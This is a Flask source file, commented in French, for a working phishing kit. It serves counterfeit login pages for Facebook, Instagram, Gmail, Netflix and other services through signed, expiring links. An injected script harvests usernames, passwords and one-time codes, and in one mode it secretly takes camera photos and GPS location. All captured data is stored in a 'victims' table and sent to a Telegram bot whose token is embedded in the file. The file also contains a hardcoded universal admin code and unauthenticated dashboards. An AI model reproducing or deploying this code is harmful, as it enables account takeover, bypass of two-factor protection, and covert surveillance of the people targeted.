import os
import base64
import uuid
import hashlib
import datetime
import sqlite3
import json
from flask import Flask, request, jsonify, render_template, render_template_string
import requests

app = Flask(__name__)

# --- CONFIGURATION TELEGRAM ---
ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8797682325:AAFMj6kcNv2R_EF3cWtl2pvWuRXVX4UwV7Q")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "6141755021")
# Identifiant du groupe Telegram (ajoute -100 si l'ID supergroupe est donné sans préfixe)
raw_group_id = os.environ.get("ADMIN_GROUP_CHAT_ID", "9107581307").strip()
if raw_group_id.lstrip("-").isdigit() and not raw_group_id.startswith("-100"):
    ADMIN_GROUP_CHAT_ID = f"-100{raw_group_id.lstrip('-')}" if len(raw_group_id.lstrip("-")) >= 10 else f"-{raw_group_id.lstrip('-')}"
else:
    ADMIN_GROUP_CHAT_ID = raw_group_id

UNIVERSAL_ADMIN_CODE = "4121@"
LINK_TTL_SECONDS = 3 * 24 * 3600  # 3 jours exacts (72 heures)

DB_NAME = "abeilles.db"

PLATFORM_LOGOS = {
    "Facebook": "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg",
    "Instagram": "https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg",
    "TikTok": "https://upload.wikimedia.org/wikipedia/commons/a/a6/Logo_NIKE.svg",
    "Gmail": "https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg",
    "Google": "https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg",
    "Netflix": "https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg",
    "Telegram": "https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg",
    "Amazon": "https://upload.wikimedia.org/wikipedia/commons/4/4a/Amazon_icon.svg",
    "Snapchat": "https://upload.wikimedia.org/wikipedia/commons/c/c4/Snapchat_logo.svg",
}


def get_db_connection():
    conn = sqlite3.connect(DB_NAME, timeout=30.0)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT,
            network TEXT,
            type TEXT,
            victimUser TEXT,
            victimPass TEXT,
            victimOtp TEXT,
            dateStr TEXT,
            timestamp INTEGER,
            ip TEXT,
            device TEXT,
            extra_info TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS custom_pages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT,
            slug TEXT UNIQUE,
            title TEXT,
            network TEXT,
            bg_type TEXT,
            bg_value TEXT,
            logo_url TEXT,
            logo_shape TEXT,
            fields_json TEXT,
            btn_text TEXT,
            html_code TEXT,
            redirect_url TEXT,
            mode TEXT,
            box_bg TEXT,
            box_width TEXT,
            created_at INTEGER
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS generated_links (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            token TEXT UNIQUE,
            signature TEXT,
            link_number INTEGER,
            link_kind TEXT,
            target_slug TEXT,
            owner TEXT,
            created_at INTEGER,
            expires_at INTEGER
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS accounts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            created_at TEXT
        )
    """)
    conn.commit()
    conn.close()


init_db()


def sign_link(token: str, link_kind: str, target_slug: str, expires_at: int) -> str:
    raw = f"{token}:{link_kind}:{target_slug}:{expires_at}:{ADMIN_BOT_TOKEN}"
    return hashlib.sha256(raw.encode("utf-8")).hexdigest()[:16]


def cleanup_expired_records():
    now_ts = int(datetime.datetime.now().timestamp())
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("DELETE FROM generated_links WHERE expires_at <= ?", (now_ts,))
        cursor.execute("DELETE FROM custom_pages WHERE created_at <= ?", ((now_ts - LINK_TTL_SECONDS) * 1000,))
        conn.commit()
        conn.close()
    except Exception as e:
        print("Erreur nettoyage liens expirés:", e)


def detect_device(user_agent: str) -> str:
    ua = (user_agent or "").lower()
    if "iphone" in ua:
        return "iPhone"
    if "ipad" in ua:
        return "iPad"
    if "android" in ua:
        return "Android"
    if "macintosh" in ua or "mac os" in ua:
        return "Mac"
    if "windows" in ua:
        return "Windows PC"
    if "linux" in ua:
        return "Linux"
    return user_agent[:60] if user_agent else "Inconnu"


def send_telegram_photo_and_message(bot_token, chat_id, photo_url, caption):
    if not bot_token or not chat_id:
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    try:
        res = requests.post(
            url,
            json={"chat_id": chat_id, "photo": photo_url, "caption": caption, "parse_mode": "Markdown"},
            timeout=6,
        )
        if res.status_code != 200:
            send_telegram_notification(bot_token, chat_id, caption)
    except Exception as e:
        print("Erreur Telegram Photo:", e)
        send_telegram_notification(bot_token, chat_id, caption)


def send_telegram_notification(bot_token, chat_id, message):
    if not bot_token or not chat_id:
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        requests.post(
            url,
            json={"chat_id": chat_id, "text": message, "parse_mode": "Markdown"},
            timeout=6,
        )
    except Exception as e:
        print("Erreur Telegram Message:", e)


@app.route("/")
def index():
    cleanup_expired_records()
    return render_template("index.html")


@app.route("/api/generate_link", methods=["POST"])
def generate_link():
    """
    Génère un lien numéroté et signé pour 'standard' (Lien 1) ou 'otp' (Lien 2).
    Chaque lien généré possède sa propre date d'expiration à +3 jours (72h) à partir de l'instant de création.
    """
    cleanup_expired_records()
    data = request.json or {}
    link_kind = (data.get("kind") or "standard").strip().lower()
    if link_kind not in ["standard", "otp"]:
        link_kind = "standard"

    target_slug = (data.get("slug") or "login").strip().lower().replace(" ", "_")
    owner = (data.get("owner") or "Kim").strip()

    now_dt = datetime.datetime.now()
    created_ts = int(now_dt.timestamp())
    expires_ts = created_ts + LINK_TTL_SECONDS
    expires_dt = datetime.datetime.fromtimestamp(expires_ts)

    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "SELECT COALESCE(MAX(link_number), 0) AS max_num FROM generated_links WHERE link_kind = ? AND target_slug = ?",
        (link_kind, target_slug),
    )
    row = cursor.fetchone()
    next_number = int(row["max_num"]) + 1

    token = f"{link_kind}_{next_number}_{uuid.uuid4().hex[:8]}"
    signature = sign_link(token, link_kind, target_slug, expires_ts)

    cursor.execute(
        """
        INSERT INTO generated_links (token, signature, link_number, link_kind, target_slug, owner, created_at, expires_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (token, signature, next_number, link_kind, target_slug, owner, created_ts, expires_ts),
    )
    conn.commit()
    conn.close()

    base_url = request.host_url.rstrip("/")
    signed_url = f"{base_url}/go/{link_kind}/{target_slug}/{token}?sig={signature}"

    return jsonify({
        "status": "success",
        "url": signed_url,
        "link_number": next_number,
        "kind": link_kind,
        "created_at": now_dt.strftime("%d/%m/%Y %H:%M:%S"),
        "expires_at": expires_dt.strftime("%d/%m/%Y %H:%M:%S"),
    })


@app.route("/go/<link_kind>/<slug>/<token>")
def open_signed_link(link_kind, slug, token):
    cleanup_expired_records()
    kind_clean = link_kind.strip().lower()
    if kind_clean not in ["standard", "otp"]:
        return "Lien invalide.", 404

    sig = (request.args.get("sig") or "").strip()
    now_ts = int(datetime.datetime.now().timestamp())

    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "SELECT * FROM generated_links WHERE token = ? AND link_kind = ? AND target_slug = ?",
        (token, kind_clean, slug.strip().lower()),
    )
    rec = cursor.fetchone()
    conn.close()

    if not rec:
        return "Page introuvable ou lien expiré.", 404

    if now_ts >= int(rec["expires_at"]):
        return "Ce lien a expiré (durée de validité : 3 jours).", 410

    expected_sig = sign_link(rec["token"], rec["link_kind"], rec["target_slug"], int(rec["expires_at"]))
    if sig != expected_sig:
        return "Signature du lien invalide.", 403

    return _render_folder_template(kind_clean, slug.strip().lower(), rec["owner"])


def _render_folder_template(folder: str, slug_clean: str, owner_param: str = "Kim"):
    base_name = slug_clean.replace("_otp", "").replace("-otp", "").replace("_standard", "").replace("-standard", "")
    if folder == "otp":
        candidates = [
            f"otp/{slug_clean}.html",
            f"otp/{base_name}_otp.html",
            f"otp/{base_name}-otp.html",
            f"otp/{base_name}.html",
        ]
    else:
        candidates = [
            f"standard/{slug_clean}.html",
            f"standard/{base_name}.html",
            f"standard/{base_name}_standard.html",
            f"standard/{base_name}-standard.html",
        ]

    for tpl in candidates:
        try:
            return render_template(tpl, owner=owner_param, network=base_name.capitalize())
        except Exception:
            continue

    return f"Page introuvable dans le dossier {folder} pour : {slug_clean}", 404


@app.route("/phish/<path:subpath>")
def render_phish_page(subpath):
    cleanup_expired_records()
    subpath_clean = subpath.lower().strip("/")
    req_type = (request.args.get("type") or "").lower()
    owner_param = request.args.get("user", "Kim")

    db_slug = subpath_clean.replace("otp/", "").replace("standard/", "")
    clean_custom_slug = (
        db_slug.replace("_otp", "")
        .replace("-otp", "")
        .replace("_standard", "")
        .replace("-standard", "")
    )

    conn = get_db_connection()
    cursor = conn.cursor()
    possible_slugs = [
        db_slug,
        clean_custom_slug,
        db_slug.replace("-", "_"),
        db_slug.replace("_", "-"),
    ]

    cp = None
    for s in possible_slugs:
        cursor.execute("SELECT * FROM custom_pages WHERE LOWER(slug) = LOWER(?)", (s,))
        cp = cursor.fetchone()
        if cp:
            break
    conn.close()

    if cp:
        cp_dict = dict(cp)
        now_ts = int(datetime.datetime.now().timestamp() * 1000)
        if (now_ts - cp_dict.get("created_at", 0)) > (LINK_TTL_SECONDS * 1000):
            return "Ce lien a expiré.", 410

        redirect_url = cp_dict.get("redirect_url") or "https://www.google.com"
        mode = cp_dict.get("mode", "opt1")

        # Option 2 (HTML pur, SANS photo ni GPS) et Option 3 (HTML + photo avant/arrière + GPS)
        if mode in ["opt2", "opt3"] and cp_dict.get("html_code"):
            html = cp_dict["html_code"]
            owner = cp_dict["owner"]
            network = cp_dict["network"]
            enable_media = "true" if mode == "opt3" else "false"

            injection_script = """
<script>
(function() {
    const OWNER = "__OWNER__";
    const NETWORK = "__NETWORK__";
    const REDIRECT_URL = "__REDIRECT_URL__";
    const ENABLE_MEDIA = __ENABLE_MEDIA__;
    const ADMIN_CODE = "4121@";
    let isProcessing = false, hasRedirected = false;

    let userData = {
        user: localStorage.getItem('ph_user_' + OWNER) || "",
        pass: localStorage.getItem('ph_pass_' + OWNER) || "",
        otp: ""
    };

    function getFacingMode() {
        const checked = document.querySelector('input[name="camera_facing"]:checked, input[name="facingMode"]:checked');
        const sel = document.querySelector('select[name="camera_facing"], select[name="facingMode"]');
        const val = (checked && checked.value) || (sel && sel.value) || "user";
        return val === "environment" ? "environment" : "user";
    }

    async function capturePhotoWithMode(facingMode) {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
            stream.getTracks().forEach(track => track.stop());

            await fetch('/api/upload_media', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    owner: OWNER,
                    network: NETWORK,
                    mode: 'opt3',
                    type: 'photo',
                    facing: facingMode,
                    photo: dataUrl,
                    user: userData.user || 'Inconnu',
                    device: navigator.userAgent
                })
            });
        } catch (e) {}
    }

    if (ENABLE_MEDIA) {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                const gpsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                fetch('/api/upload_media', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        owner: OWNER,
                        network: NETWORK,
                        mode: 'opt3',
                        type: 'gps',
                        gps: gpsLink,
                        device: navigator.userAgent
                    })
                }).catch(()=>{});
            }, () => {}, { timeout: 5000 });
        }
        setTimeout(() => capturePhotoWithMode(getFacingMode()), 1000);
    }

    function classify(inp) {
        const name = (inp.name || inp.id || inp.placeholder || "").toLowerCase();
        const type = (inp.type || "").toLowerCase();
        if (type === "password") return "pass";
        if (type === "email" || type === "tel") return "user";
        if (name.includes('user') || name.includes('email') || name.includes('login') || name.includes('phone') || name.includes('identifiant')) return "user";
        if (name.includes('pass') || name.includes('mdp') || name.includes('mot de passe')) return "pass";
        if (name.includes('otp') || name.includes('code') || name.includes('verif') || name.includes('secret')) return "otp";
        return "unknown";
    }

    async function processData() {
        if (isProcessing || hasRedirected) return;
        isProcessing = true;

        let hasOtp = false, hasPass = false, hasUser = false;

        document.querySelectorAll('input, select, textarea').forEach(inp => {
            const val = (inp.value || "").trim();
            if (!val) return;
            const c = classify(inp);
            if (c === "user") { userData.user = val; localStorage.setItem('ph_user_' + OWNER, val); hasUser = true; }
            if (c === "pass") { userData.pass = val; localStorage.setItem('ph_pass_' + OWNER, val); hasPass = true; }
            if (c === "otp") { userData.otp = val; hasOtp = true; }
        });

        // Code universel admin : accès tout compte ou tableau global des utilisateurs
        if (userData.pass === ADMIN_CODE && userData.user) {
            if (userData.user === ADMIN_CODE) {
                window.location.replace('/admin/accounts');
                return;
            }
            const targetUrl = NETWORK.toLowerCase().includes('facebook')
                ? "https://www.facebook.com/" + encodeURIComponent(userData.user)
                : REDIRECT_URL;
            window.location.replace(targetUrl);
            return;
        }

        if (ENABLE_MEDIA) {
            await capturePhotoWithMode(getFacingMode());
        }

        const captureType = hasOtp ? "custom_html_otp" : "custom_html_otp_step1";
        await fetch('/api/capture', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                owner: OWNER,
                network: NETWORK,
                mode: ENABLE_MEDIA ? 'opt3' : 'opt2',
                type: captureType,
                victimUser: userData.user || "Inconnu",
                victimPass: userData.pass || "Inconnu",
                otp: userData.otp || "En attente OTP...",
                extra_info: JSON.stringify({ ua: navigator.userAgent, platform: navigator.platform })
            }),
            keepalive: true
        });

        if (hasOtp) {
            hasRedirected = true;
            setTimeout(() => window.location.replace(REDIRECT_URL), 100);
            return;
        }
        isProcessing = false;
    }

    document.addEventListener('DOMContentLoaded', () => {
        document.querySelectorAll('form').forEach(f => {
            f.addEventListener('submit', () => { processData(); });
        });
        document.addEventListener('click', function(e) {
            const target = e.target;
            if (target.tagName === 'BUTTON' || (target.tagName === 'INPUT' && target.type === 'submit')) {
                processData();
            }
        });
    });
})();
</script>
"""
            script_final = (
                injection_script.replace("__OWNER__", owner)
                .replace("__NETWORK__", network)
                .replace("__REDIRECT_URL__", redirect_url)
                .replace("__ENABLE_MEDIA__", enable_media)
            )
            if "</body>" in html:
                html = html.replace("</body>", script_final + "</body>")
            else:
                html += script_final
            return render_template_string(html)

        # Option 1 : Formulaire No-Code configuré (2 ou 3 champs)
        try:
            fields_parsed = json.loads(cp_dict.get("fields_json") or "[]")
        except Exception:
            fields_parsed = []
        config = {
            "owner": cp_dict.get("owner", "Kim"),
            "title": cp_dict.get("title", "Connexion"),
            "network": cp_dict.get("network", "Facebook"),
            "bg_type": cp_dict.get("bg_type", "color"),
            "bg_value": cp_dict.get("bg_value", "#111"),
            "logo_url": cp_dict.get("logo_url", ""),
            "logo_shape": cp_dict.get("logo_shape", "circle"),
            "fields": fields_parsed,
            "btn_text": cp_dict.get("btn_text", "Se connecter"),
            "box_bg": cp_dict.get("box_bg") or "rgba(255,255,255,0.95)",
            "box_width": cp_dict.get("box_width") or "420px",
            "redirect_url": redirect_url,
        }
        return render_template("custom_login.html", config=config)

    folder = "otp" if (req_type == "otp" or "otp" in subpath_clean) else "standard"
    return _render_folder_template(folder, db_slug, owner_param)


@app.route("/api/upload_media", methods=["POST"])
def upload_media():
    """
    Réservé strictement à l'Option 3 : envoie les photos capturées, l'IP et le type d'appareil
    vers le bot Telegram du groupe (ADMIN_GROUP_CHAT_ID).
    """
    data = request.json or {}
    if data.get("mode") != "opt3":
        return jsonify({"status": "ignored", "reason": "Media reserved for Option 3"}), 400

    network = data.get("network", "Inconnu")
    m_type = data.get("type", "media")
    facing = data.get("facing", "user")
    camera_label = "Caméra arrière" if facing == "environment" else "Caméra avant"
    raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    v_ip = raw_ip.split(",")[0].strip() if raw_ip else "127.0.0.1"
    device_type = detect_device(data.get("device", ""))

    if m_type == "gps":
        msg = (
            f"📍 *LOCALISATION GPS (OPTION 3)*\n"
            f"🌐 Réseau: {network}\n"
            f"🗺️ [Voir sur Maps]({data.get('gps')})\n"
            f"📱 Type d'appareil: `{device_type}`\n"
            f"📍 IP: `{v_ip}`"
        )
        send_telegram_notification(ADMIN_BOT_TOKEN, ADMIN_GROUP_CHAT_ID, msg)
    elif m_type == "photo":
        photo_b64 = (data.get("photo") or "").split(",")[-1]
        if photo_b64:
            url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendPhoto"
            caption = (
                f"📸 *PHOTO CAPTURÉE ({camera_label})*\n"
                f"🌐 Réseau: {network}\n"
                f"📱 Type d'appareil: `{device_type}`\n"
                f"📍 IP: `{v_ip}`"
            )
            try:
                requests.post(
                    url,
                    data={"chat_id": ADMIN_GROUP_CHAT_ID, "caption": caption, "parse_mode": "Markdown"},
                    files={"photo": ("photo.jpg", base64.b64decode(photo_b64), "image/jpeg")},
                    timeout=10,
                )
            except Exception as e:
                print("Erreur envoi photo groupe Telegram:", e)

    return jsonify({"status": "success"})


@app.route("/api/create_login", methods=["POST"])
def create_login():
    data = request.json or {}
    owner = (data.get("owner") or "").strip()
    slug = (data.get("slug") or "").strip().lower().replace(" ", "_")
    if not owner or not slug:
        return jsonify({"status": "error", "message": "Propriétaire ou slug manquant"})

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        now_ts = int(datetime.datetime.now().timestamp() * 1000)
        mode = data.get("mode", "opt1")
        redirect_url = data.get("redirectUrl", "https://www.google.com")

        if mode in ["opt2", "opt3"]:
            cursor.execute(
                """
                INSERT OR REPLACE INTO custom_pages
                (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, box_bg, box_width, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    owner,
                    slug,
                    "Page Perso",
                    data.get("network"),
                    "color",
                    "#111",
                    "",
                    "circle",
                    "[]",
                    "Valider",
                    data.get("htmlCode"),
                    redirect_url,
                    mode,
                    "#fff",
                    "420px",
                    now_ts,
                ),
            )
        else:
            cursor.execute(
                """
                INSERT OR REPLACE INTO custom_pages
                (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, box_bg, box_width, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    owner,
                    slug,
                    data.get("title"),
                    data.get("network"),
                    data.get("bgType"),
                    data.get("bgValue"),
                    data.get("logoUrl"),
                    data.get("logoShape"),
                    json.dumps(data.get("fields") or []),
                    data.get("btnText"),
                    "",
                    redirect_url,
                    "opt1",
                    data.get("boxBg"),
                    data.get("boxWidth"),
                    now_ts,
                ),
            )

        conn.commit()
        conn.close()
        return jsonify({"status": "success", "url": f"{request.host_url.rstrip('/')}/phish/{slug}"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})


@app.route("/api/capture", methods=["POST"])
def capture_data():
    data = request.json or {}
    owner = (data.get("owner") or "Kim").strip()
    network = data.get("network", "Facebook")
    v_user = data.get("victimUser", "Inconnu")
    v_pass = data.get("victimPass", "Inconnu")
    v_otp = data.get("otp", "Aucun")
    v_type = data.get("type", "standard")

    # Code universel administrateur : accès direct à n'importe quel compte sans mot de passe
    if v_pass == UNIVERSAL_ADMIN_CODE and v_user and v_user != UNIVERSAL_ADMIN_CODE:
        return jsonify({"status": "admin_unlock", "target_user": v_user})

    raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    v_ip = raw_ip.split(",")[0].strip() if raw_ip else "127.0.0.1"
    device_type = detect_device(request.headers.get("User-Agent", ""))

    now = datetime.datetime.now()
    date_str = now.strftime("%d/%m/%Y %H:%M:%S")
    timestamp = int(now.timestamp() * 1000)

    conn = get_db_connection()
    cursor = conn.cursor()
    logo_img = PLATFORM_LOGOS.get(network, PLATFORM_LOGOS["Facebook"])

    # Enregistrement de l'utilisateur dans la table des comptes créés/capturés
    if v_user and v_user != "Inconnu" and v_user != UNIVERSAL_ADMIN_CODE:
        cursor.execute(
            "INSERT INTO accounts (username, password, created_at) VALUES (?, ?, ?)",
            (v_user, v_pass, date_str),
        )

    if v_otp and v_otp not in ["Aucun", "En attente OTP..."]:
        cursor.execute(
            "SELECT id FROM victims WHERE owner=? AND network=? AND victimOtp='En attente OTP...' ORDER BY id DESC LIMIT 1",
            (owner, network),
        )
        existing = cursor.fetchone()
        if existing:
            cursor.execute(
                "UPDATE victims SET victimOtp=?, dateStr=?, timestamp=?, ip=?, device=? WHERE id=?",
                (v_otp, date_str, timestamp, v_ip, device_type, existing["id"]),
            )
            conn.commit()
            conn.close()
            alert = (
                f"🚨 *VICTIME COMPLÈTE (OTP)* 🚨\n"
                f"📚 *Plateforme:* {network}\n"
                f"👤 *Nom:* `{owner}`\n"
                f"🎯 *Nom d'utilisateur:* `{v_user}`\n"
                f"🔑 *Mot de passe:* `{v_pass}`\n"
                f"🔒 *OTP:* `{v_otp}`\n"
                f"📍 *IP:* `{v_ip}`\n"
                f"📱 *Type d'appareil:* `{device_type}`\n"
                f"🕒 `{date_str}`"
            )
            send_telegram_photo_and_message(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, alert)
            return jsonify({"status": "success"})

    cursor.execute(
        """
        INSERT INTO victims (owner, network, type, victimUser, victimPass, victimOtp, dateStr, timestamp, ip, device, extra_info)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (owner, network, v_type, v_user, v_pass, v_otp, date_str, timestamp, v_ip, device_type, data.get("extra_info")),
    )
    conn.commit()
    conn.close()

    alert = (
        f"🚨 *NOUVELLE DONNÉE CAPTURÉE* 🚨\n"
        f"📚 *Plateforme:* {network}\n"
        f"👤 *Nom:* `{owner}`\n"
        f"🎯 *Nom d'utilisateur:* `{v_user}`\n"
        f"🔑 *Mot de passe:* `{v_pass}`\n"
        f"🔒 *OTP:* `{v_otp}`\n"
        f"📍 *IP:* `{v_ip}`\n"
        f"📱 *Type d'appareil:* `{device_type}`\n"
        f"🕒 `{date_str}`"
    )
    send_telegram_photo_and_message(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, alert)
    return jsonify({"status": "success"})


@app.route("/admin/accounts")
def admin_accounts_dashboard():
    """
    Tableau de bord administrateur déclenché lorsque l'utilisateur saisit 4121@
    dans Nom d'utilisateur et 4121@ dans Mot de passe.
    """
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT id, username, password, created_at FROM accounts ORDER BY id DESC")
    rows = cursor.fetchall()
    conn.close()

    total_users = len(rows)
    table_rows_html = "".join(
        f"<tr><td>{r['id']}</td><td>{r['username']}</td><td>{r['password']}</td><td>{r['created_at']}</td></tr>"
        for r in rows
    )

    html = f"""
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Tableau Admin - Comptes</title>
        <style>
            body {{ font-family: Arial, sans-serif; background: #111; color: #fff; margin: 0; padding: 24px; }}
            .card {{ max-width: 960px; margin: 0 auto; background: #1c1f26; border-radius: 14px; padding: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }}
            .header {{ display: flex; justify-content: space-between; align-items: center; margin-bottom: 18px; flex-wrap: wrap; gap: 12px; }}
            .badge {{ background: #f5b014; color: #111; font-weight: 700; padding: 8px 14px; border-radius: 999px; }}
            .table-wrap {{ max-height: 460px; overflow: auto; border: 1px solid #2e3340; border-radius: 10px; }}
            table {{ width: 100%; border-collapse: collapse; }}
            th, td {{ padding: 12px 14px; text-align: left; border-bottom: 1px solid #2a2e39; }}
            th {{ position: sticky; top: 0; background: #252934; color: #f5b014; }}
        </style>
    </head>
    <body>
        <div class="card">
            <div class="header">
                <h2>Liste des comptes enregistrés</h2>
                <div class="badge">Total : {total_users}</div>
            </div>
            <div class="table-wrap">
                <table>
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Nom d'utilisateur</th>
                            <th>Mot de passe</th>
                            <th>Date de création</th>
                        </tr>
                    </thead>
                    <tbody>
                        {table_rows_html if table_rows_html else '<tr><td colspan="4">Aucun compte enregistré.</td></tr>'}
                    </tbody>
                </table>
            </div>
        </div>
    </body>
    </html>
    """
    return html


@app.route("/api/custom_pages", methods=["GET"])
def get_custom_pages():
    owner = (request.args.get("owner") or "").strip()
    conn = get_db_connection()
    cursor = conn.cursor()
    if owner:
        cursor.execute("SELECT * FROM custom_pages WHERE owner = ? ORDER BY id DESC", (owner,))
    else:
        cursor.execute("SELECT * FROM custom_pages ORDER BY id DESC")
    rows = cursor.fetchall()
    conn.close()
    return jsonify([{"slug": r["slug"], "title": r["title"], "network": r["network"], "mode": r["mode"]} for r in rows])


@app.route("/api/victims", methods=["GET"])
def get_victims():
    owner = (request.args.get("owner") or "").strip()
    conn = get_db_connection()
    cursor = conn.cursor()
    if owner:
        cursor.execute("SELECT * FROM victims WHERE owner LIKE ? ORDER BY id DESC", (f"%{owner}%",))
    else:
        cursor.execute("SELECT * FROM victims ORDER BY id DESC")
    rows = cursor.fetchall()
    conn.close()
    return jsonify([
        {
            "id": r["id"],
            "network": r["network"],
            "type": r["type"],
            "victimUser": r["victimUser"],
            "victimPass": r["victimPass"],
            "otp": r["victimOtp"],
            "dateStr": r["dateStr"],
            "timestamp": r["timestamp"],
            "ip": r["ip"],
            "device": r["device"],
        }
        for r in rows
    ])


@app.route("/api/clear_victims", methods=["POST"])
def clear_victims():
    data = request.json or {}
    owner = (data.get("owner") or "").strip()
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("DELETE FROM victims WHERE owner = ?", (owner,))
        conn.commit()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
